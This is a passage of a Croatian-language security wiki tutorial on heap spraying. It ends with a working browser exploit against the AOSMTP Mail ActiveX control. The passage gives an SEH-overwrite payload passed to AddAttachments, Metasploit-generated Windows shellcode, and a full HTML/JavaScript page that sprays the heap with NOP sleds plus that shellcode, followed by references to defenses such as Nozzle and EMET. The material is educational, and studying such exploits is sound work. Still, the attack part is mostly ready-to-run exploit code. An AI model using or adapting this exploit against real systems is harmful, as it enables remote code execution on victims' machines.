+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Module_adress.png" class="image"><img alt="" src="../images/thumb/a/a8/Module_adress.png/300px-Module_adress.png" width="300" height="107" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Module_adress.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> </div></div></div></div></div>
+<p>Struktura koda koji dostavljamo će izgledati:
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Struktura_koda333.png" class="image"><img alt="" src="../images/thumb/8/86/Struktura_koda333.png/300px-Struktura_koda333.png" width="300" height="91" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Struktura_koda333.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> </div></div></div></div></div>
+<p><br />
+</p>
+<code><pre>
+     // isto kao i kod skripte iznad
+ 
+     junk1 = &quot;&quot;;
+     while(junk1.length &lt; 272) junk1+=&quot;C&quot;;
+
+     ret = &quot;\xff\xff\xff\xff&quot;;
+     junk2 = &quot;BBBBBBBB&quot;;
+     nseh = &quot;AAAA&quot;;
+     seh = &quot;\x06\x06\x06\x06&quot;;
+
+     payload = junk1 + ret + junk2 + nseh + seh;
+
+     target.AddAttachments(payload);
+
+   &lt;/script&gt;
+&lt;/html&gt;
+</pre></code>
+<p>Kad pokrenemo tu skriptu onda pokrene exception jer se u Saved Ret ptr nalazi adresa koju ne možemo doseći te se skoči na adresu 0x06060606. Rezultat se vidi na slici ispod:
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Nopsi_2123.png" class="image"><img alt="" src="../images/thumb/c/c9/Nopsi_2123.png/300px-Nopsi_2123.png" width="300" height="262" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Nopsi_2123.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> </div></div></div></div></div>
+<p>I sada je samo ostalo da umjesto nekog random koda ubacimo stvarni shellcode.
+Možemo ga generirati s msfpayload-om dostupnim <a href="http://www.metasploit.com/download/" class="external text" rel="nofollow">ovdje</a>.
+</p>
+<code><pre>
+[sasa@fedora ~]$ msfpayload windows/messagebox TEXT='Do something ...' TITLE=owned J
+// windows/messagebox - 265 bytes
+// http://www.metasploit.com
+// VERBOSE=false, EXITFUNC=process, TITLE=owned, TEXT=Do 
+// something ..., ICON=NO
+%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%
+u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%
+uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3
+%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68
+%u206c%u6841%u3233%u642e%u7568%u6573%u8872%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff61%uffff
+%u6468%u2058%u6820%u776f%u656e%udb31%u5c88%u0524%ue389%u5868%u2020%u6820%u2e20%u2e2e%u6868%u6e69%u6867%u6d6f%u7465%u4468
+%u206f%u3173%u88c9%u244c%u8910%u31e1%u52d2%u5153%uff52%u31d0%u50c0%u55ff%u4108
+</pre></code>
+<p>Izlaz samo kopiramo te na kraju skripta izgleda:
+</p>
+<code><pre>
+&lt;html&gt;
+   &lt;!-- Load the AOSMTP Mail Object --&gt;
+   &lt;object classid='clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82' id='target' &gt;&lt;/object&gt;
+   &lt;script &gt;
+
+      var shellcode = unescape('%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20
+        &#160;%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb
+        &#160;%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124
+        &#160;%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e
+        &#160;%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233
+        &#160;%u642e%u7568%u6573%u8872%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff61%uffff
+        &#160;%u6468%u2058%u6820%u776f%u656e%udb31%u5c88%u0524%ue389%u5868%u2020%u6820%u2e20%u2e2e%u6868%u6e69%u6867
+        &#160;%u6d6f%u7465%u4468%u206f%u3173%u88c9%u244c%u8910%u31e1%u52d2%u5153%uff52%u31d0%u50c0%u55ff%u4108');
+
+      var bigblock = unescape('%u9090%u9090');
+      var headersize = 20;
+      var slackspace = headersize + shellcode.length;
+      while (bigblock.length &lt; slackspace) bigblock += bigblock;
+      var fillblock = bigblock.substring(0,slackspace);
+      var block = bigblock.substring(0,bigblock.length - slackspace);
+      while (block.length + slackspace &lt; 0x40000) block = block + block + fillblock;
+      var memory = new Array();
+      for (i = 0; i &lt; 500; i++){ memory[i] = block + shellcode }
+      junk1 = &quot;&quot;;
+      while(junk1.length &lt; 272) junk1+=&quot;C&quot;;
+
+      ret = &quot;\xff\xff\xff\xff&quot;;
+      junk2 = &quot;BBBBBBBB&quot;;
+      nseh = &quot;AAAA&quot;;
+      seh = &quot;\x06\x06\x06\x06&quot;;
+
+      payload = junk1 + ret + junk2 + nseh + seh;
+
+      target.AddAttachments(payload);
+
+   &lt;/script&gt;
+&lt;/html&gt;
+</pre></code>
+<p>Kada se pokrene izgleda kao na slici ispod, da se pokrene neki program kao npr. kalkulator, notepad i sl., on bi ostao pokrenut jer MessageBox se zatvori sam po sebi, a pretraživač padne kao i sad.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:402px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Owned_12376.png" class="image"><img alt="" src="../images/thumb/d/d6/Owned_12376.png/400px-Owned_12376.png" width="400" height="350" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Owned_12376.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> </div></div></div></div></div>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Sacalopek&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Sacalopek (stranica ne postoji)">sacalopek</a> 18:17, 20. siječnja 2013. (CET)
+</p>
+<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
+<p>1. <a href="https://lirias.kuleuven.be/bitstream/123456789/265421/1/fulltext.pdf" class="external text" rel="nofollow">BuBBle: A Javascript Engine Level Countermeasure against Heap-Spraying Attacks</a>
+</p><p>2. <a href="http://http://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf" class="external text" rel="nofollow">Sotirov, A.: Heap feng shui in javascript (2007)</a>
+</p><p>3. <a href="https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/" class="external text" rel="nofollow">Corelan Team: Heap Spraying Demystified</a>
+</p><p>4. <a href="http://en.wikipedia.org/wiki/Stack_(abstract_data_type)" class="external text" rel="nofollow">Wikipedia: Stack</a>
+</p><p>5. <a href="http://en.wikipedia.org/wiki/Heap_(data_structure)" class="external text" rel="nofollow">Wikipedia: Heap</a>
+</p><p>6. <a href="http://en.wikipedia.org/wiki/Heap_spraying" class="external text" rel="nofollow">Wikipedia: Heap spraying</a>
+</p><p>7. <a href="http://blog.didierstevens.com/programs/heaplocker/" class="external text" rel="nofollow">HeapLocker - blog developera.</a>
+</p><p>8. <a href="http://research.microsoft.com/pubs/76528/tr-2008-176.pdf" class="external text" rel="nofollow">Nozzle: A Defense Against Heap-spraying Code Injection Attacks</a>
+</p><p>9. <a href="http://blogs.technet.com/b/srd/archive/2012/05/15/introducing-emet-v3.aspx" class="external text" rel="nofollow">Introducing EMET v3</a>
+</p><p>Slike:
+</p><p>Neke preuzete s linka 3.
+</p><p>Slike HeapLockera preuzete s linka 7.
+</p><p>Kod je preuzet s linka 3.
+</p>
+<!-- 
+NewPP limit report
+Preprocessor node count: 300/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:4414-0!*!0!!hr!2!edit=0 and timestamp 20190203204047 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Heap_Spraying.html">http://security.foi.hr/wiki/index.php/Heap_Spraying</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Heap_Spraying" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Heap_Spraying.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Heap_Spraying&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Heap_Spraying.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Heap_Spraying.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Heap_Spraying&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Heap_Spraying&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Heap_Spraying.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Heap_Spraying" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Heap_Spraying" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Heap_Spraying&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Heap_Spraying&amp;oldid=15919" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 18:26, 20. siječnja 2013.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 16.764 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Heap_Spraying", "wgTitle": "Heap Spraying", "wgAction": "view", "wgArticleId": 4414, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 15919, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.695 secs. -->			</body>
+</html>
